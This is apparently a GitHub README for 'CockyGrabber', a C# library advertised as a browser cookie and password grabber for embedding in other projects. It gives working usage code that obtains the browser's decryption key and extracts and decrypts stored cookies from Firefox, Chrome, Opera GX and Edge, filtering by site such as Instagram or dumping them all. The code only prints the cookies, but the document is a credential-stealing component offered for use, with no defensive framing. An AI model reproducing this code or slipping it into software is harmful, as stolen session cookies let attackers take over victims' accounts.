# CockyGrabber
A Browser Cookies & Passwords Grabber C#.NET Library that you can itegrate in your Projects.
*(More Supported Browsers in Future!)*

## Download: 

For download all necessary packages, you can do from nuget with searching `CockyGrabber` and download the 1.2.0 version. once done, just download the library from the last [release](https://github.com/TheBackdoor/CockyGrabber/releases/download/2.1.0/webGrabber.dll).

## Usage:
**Import Cockygrabber classes:**</br>
It's not necessary but it will look better if you import CockyGrabber:
```cs
using CockyGrabber;
using Cookie = CockyGrabber.Classes.Cookie;
```
</br>
then you will need to import a few packages to make CockyGrabber work

```cs
using System.Data.SQLite; // link: https://www.nuget.org/packages/System.Data.SQLite/
using Newtonsoft.Json; // link: https://www.nuget.org/packages/Newtonsoft.Json/
using System.Security.Cryptography.ProtectedData; // link: https://www.nuget.org/packages/System.Security.Cryptography.ProtectedData
using BouncyCastle; // link: https://www.nuget.org/packages/BouncyCastle/
```


</br>
</br>

**Getting The Key to decrypt cookies:**</br>
First you need to get a Key to decrypt the Cookies.

Replace `[GrabberClass]` with the Cookie Grabber Class you want to use (OperaGxGrabber/ChromeGrabber. Firefox doesn't need a key because it don't encrypts cookies)
```cs
[GrabberClass] grabber = new [GrabberClass]
byte[] keyToDecryptEncrypedDB = grabber.GetKey();
```
</br>
</br>

**Grabbing Cookies:**</br>
Cookie Grabbing with CockyGrabber is *REALLY EASY*.
</br>
</br>
*Cookie Hostname examples: ".instagram.com" for instagram cookies, ".github.com" for github cookies, ".stackoverflow.com" for stackoverflow cookies, ...*
</br>
</br>
</br>


Firefox Cookie Grabbing:

```cs
FirefoxGrabber grabber = new FirefoxGrabber();

// Get cookies by hostname:
foreach(Cookie cookie in grabber.GetCookiesByHostname(".instagram.com"))
{
    string cookieHostname = cookie.HostName;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
}

// Get All cookies:
foreach(Cookie cookie in grabber.GetAllCookies())
{
    string cookieHostname = cookie.HostName;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
} 
```
</br>
</br>

Chrome Cookie Grabbing:
</br>
Since Chrome cookie values are encrypted with BLOB, we need a key to decrypt the data. (I defined the key on line 21, README.md)
</br>

```cs
ChromeGrabber grabber = new ChromeGrabber();

// Get cookies by hostname:
foreach(Cookie cookie in grabber.GetCookiesByHostname(".instagram.com", keyToDecryptEncrypedDB))
{
    string cookieHostname = cookie.HostName;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
}

// Get All cookies:
foreach(Cookie cookie in grabber.GetAllCookies(keyToDecryptEncrypedDB))
{
    string cookieHostname = cookie.HostName;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
}
```

</br>
</br>

OperaGx Cookie Grabbing:
</br>
OperaGx also encrypts cookies so you need a key here too.
</br>

```cs
OperaGxGrabber grabber = new OperaGxGrabber();

// Get cookies by hostname:
foreach(Cookie cookie in grabber.GetCookiesByHostname(".instagram.com", keyToDecryptEncrypedDB))
{
    string cookieHostname = cookie.HostName;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
}

// Get All cookies:
foreach(Cookie cookie in grabber.GetAllCookies(keyToDecryptEncrypedDB))
{
    string cookieHostname = cookie.HostName;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
}
```
</br>
</br>

Edge Cookie Grabbing:
</br>
Edge also encrypts cookies so you need a key here too.
</br>

```cs
EdgeGrabber grabber = new EdgeGrabber();

// Get cookies by hostname:
foreach(Cookie cookie in grabber.GetCookiesByHostname(".instagram.com", keyToDecryptEncrypedDB))
{
    string cookieHostname = cookie.HostName;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
}

// Get All cookies:
foreach(Cookie cookie in grabber.GetAllCookies(keyToDecryptEncrypedDB))
{
    string cookieHostname = cookie.HostName;
    string cookieName = cookie.Name;
    string cookieValue = cookie.Value;
    Console.WriteLine($"{cookieHostname} = {cookieName}: {cookieValue}");
}
```
</br>
</br>

## End
</br>
Yea thats it for now. Fork/Star/Watch this repo to dont miss new releases!
</br>
</br>
If you want to script with me then create a Issue!
</br>
---
</br>

If you found any **Bugs** then please create a Issue!
